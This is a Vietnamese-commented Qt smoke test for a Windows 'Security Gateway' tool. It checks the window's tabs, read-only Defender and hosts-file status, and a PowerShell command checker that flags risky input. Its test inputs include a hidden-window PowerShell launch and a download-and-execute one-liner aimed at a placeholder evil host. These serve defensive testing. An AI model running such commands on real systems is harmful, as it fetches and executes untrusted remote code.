// Kiểm thử "khói" cho giao diện Security Gateway: dựng cửa sổ, không crash, đủ 3 tab. CÓ gọi
// DefenderController::getStatus()/HostsBlocklist::listBlockedDomains() THẬT (chỉ đọc, an toàn - giống
// VpnController::listConnections()/PartitionManager::listPartitions()/AdbController::listDevices()) để
// xác nhận plumbing PowerShell/hosts file hoạt động được trên máy build. KHÔNG BAO GIỜ tự động bật/tắt
// bảo vệ thật, quét máy thật, xóa mối đe dọa thật, sửa hosts file thật, hay mở PowerShell/dán lệnh thật
// trong test tự động - những thao tác đó đổi trạng thái hệ thống thật và/hoặc cần quyền Administrator,
// phải được tự kiểm tra tay.
#include <QApplication>
#include <QElapsedTimer>
#include <QThread>
#include <QLabel>
#include <QPushButton>
#include <QTabWidget>
#include <QTemporaryDir>
#include "TestDataDir.h"
#include <cstdio>

#include "core/AppPaths.h"

#include <QCheckBox>
#include <QPlainTextEdit>

#include "tools/security/CommandGatewayTab.h"
#include "tools/security/SecurityGatewayWindow.h"
#include "tools/security/engine/DefenderController.h"
#include "tools/security/engine/HostsBlocklist.h"

static int g_fail = 0, g_pass = 0;
#define CHECK(cond)                                                            \
    do {                                                                       \
        if (cond) { ++g_pass; }                                                \
        else { ++g_fail; std::printf("FAIL line %d: %s\n", __LINE__, #cond); } \
    } while (0)

int main(int argc, char** argv)
{
    QApplication app(argc, argv);

    // Cửa sổ ghi log khi mở - ép dữ liệu vào thư mục tạm để test không ghi vào log thật của người dùng.
    TestDataDir dataDir;
    AppPaths::setDataDirOverride(dataDir.path());

    QElapsedTimer buildTimer;
    buildTimer.start();
    SecurityGatewayWindow win;
    const qint64 buildMs = buildTimer.elapsed();
    win.setAttribute(Qt::WA_DontShowOnScreen, true);
    win.show();
    app.processEvents();
    CHECK(true); // tới được đây tức là dựng cửa sổ không crash

    // Hồi quy v1.19.23: lệnh Defender chạy NỀN - dựng cửa sổ không còn chờ 3 lệnh PowerShell (trước đây
    // 3-10 giây đứng hình). Ngay sau khi dựng, nhãn trạng thái phải đang ở "⏳ Đang đọc..." (kết quả chưa về)
    // - nếu lệnh còn chạy đồng bộ thì lúc này nhãn đã là kết quả. Thời gian dựng chỉ in ra để tham khảo
    // (lần dựng cửa sổ đầu tiên của tiến trình còn gồm chi phí khởi tạo font/style của Qt).
    std::printf("Dung cua so Security Gateway: %lld ms\n", static_cast<long long>(buildMs));
    auto loadingLabels = [&win]() {
        int n = 0;
        for (auto* l : win.findChildren<QLabel*>())
            if (l->text().startsWith(QString::fromUtf8("⏳ Đang đọc trạng thái")))
                ++n;
        return n;
    };
    CHECK(loadingLabels() >= 1); // đang hiện "đang đọc" thay vì đứng hình
    QElapsedTimer waitTimer;
    waitTimer.start();
    while (loadingLabels() > 0 && waitTimer.elapsed() < 90000)
    {
        app.processEvents(QEventLoop::AllEvents, 50);
        QThread::msleep(20);
    }
    CHECK(loadingLabels() == 0); // kết quả nền đã về và được hiển thị

    auto* tabs = win.findChild<QTabWidget*>();
    CHECK(tabs != nullptr && tabs->count() == 3);

    const auto buttons = win.findChildren<QPushButton*>();
    CHECK(buttons.size() >= 5); // Kiểm tra lệnh, Mở PowerShell, Làm mới x2, bật/tắt bảo vệ, quét...

    const auto labels = win.findChildren<QLabel*>();
    CHECK(labels.size() >= 3);

    // ---- Máy trạng thái tab "Cổng lệnh PowerShell" (KHÔNG bao giờ bấm nút Mở PowerShell trong test này - luồng
    // mở + dán thật được kiểm ở command_launcher_tests với console ẩn) ----
    {
        auto* tab = win.findChild<CommandGatewayTab*>();
        CHECK(tab != nullptr);
        auto* edit = tab ? tab->findChild<QPlainTextEdit*>() : nullptr;
        auto* ack = tab ? tab->findChild<QCheckBox*>() : nullptr;
        QPushButton* analyzeBtn = nullptr;
        QPushButton* launchBtn = nullptr;
        if (tab)
            for (auto* b : tab->findChildren<QPushButton*>())
            {
                if (b->text().contains(QString::fromUtf8("Kiểm tra")))
                    analyzeBtn = b;
                else if (b->text().contains("PowerShell"))
                    launchBtn = b;
            }
        CHECK(edit && ack && analyzeBtn && launchBtn);
        // Nhãn hiện đúng "&" (không bị hiểu thành phím tắt - bản trước hiện "Mở PowerShell _dán lệnh")
        CHECK(launchBtn && launchBtn->text().contains("&&"));
        if (edit && ack && analyzeBtn && launchBtn)
        {
            auto analyze = [&](const QString& text) {
                edit->setPlainText(text);
                app.processEvents();
                CHECK(!launchBtn->isEnabled()); // nội dung mới -> phải kiểm tra lại trước khi mở
                analyzeBtn->click();
                app.processEvents();
            };
            CHECK(!launchBtn->isEnabled()); // chưa kiểm tra gì

            analyze("Get-Date");
            CHECK(launchBtn->isEnabled());  // An toàn -> mở được ngay
            CHECK(!ack->isVisibleTo(tab));

            analyze(QString("powershell -w hid") + "den -File a.ps1"); // Đáng chú ý
            CHECK(launchBtn->isEnabled());
            CHECK(!ack->isVisibleTo(tab));

            // Nguy hiểm: phải tích xác nhận mới bật nút (ghép từ mảnh - xem security_tests.cpp hàm S())
            analyze(QString("irm https://evil.example/a.ps1 | i") + "ex");
            CHECK(ack->isVisibleTo(tab));
            CHECK(!ack->isChecked());
            CHECK(!launchBtn->isEnabled());
            ack->setChecked(true);
            app.processEvents();
            CHECK(launchBtn->isEnabled());
            ack->setChecked(false);
            app.processEvents();
            CHECK(!launchBtn->isEnabled());

            // Sửa nội dung sau khi đã xác nhận: xóa xác nhận cũ, khóa nút, ẩn kết luận cũ
            ack->setChecked(true);
            app.processEvents();
            edit->setPlainText(edit->toPlainText() + " ");
            app.processEvents();
            CHECK(!ack->isChecked());
            CHECK(!ack->isVisibleTo(tab));
            CHECK(!launchBtn->isEnabled());

            // Trống / chỉ khoảng trắng: không bao giờ bật nút
            analyze("   \n\t ");
            CHECK(!launchBtn->isEnabled());
            edit->clear();
            app.processEvents();
        }
    }

    // Chỉ đọc, an toàn - đọc trạng thái Windows Defender THẬT trên máy build.
    QString error;
    const auto status = DefenderController::getStatus(&error);
    std::printf("Get-MpComputerStatus that: AntivirusEnabled=%d RealTime=%d AMRunningMode=%s%s%s\n",
               status.antivirusEnabled, status.realTimeProtectionEnabled, qPrintable(status.runningMode),
               error.isEmpty() ? "" : " loi=", error.isEmpty() ? "" : qPrintable(error));
    CHECK(true); // tới được đây tức là gọi PowerShell thật không crash

    // Chỉ đọc, an toàn - đọc hosts file THẬT trên máy build (danh sách chặn tùy chỉnh có thể rỗng).
    QString hostsError;
    const auto blocked = HostsBlocklist::listBlockedDomains(&hostsError);
    std::printf("Danh sach chan tuy chinh that: %d ten mien\n", static_cast<int>(blocked.size()));
    CHECK(true);

    std::printf("passed=%d failed=%d\n", g_pass, g_fail);
    std::printf("\nLUU Y: bat/tat bao ve that, quet may that, xoa moi de doa that, sua hosts file that,\n");
    std::printf("va mo PowerShell/dan lenh that KHONG duoc tu dong hoa trong test nay - can tu kiem tra tay.\n");
    return g_fail == 0 ? 0 : 1;
}
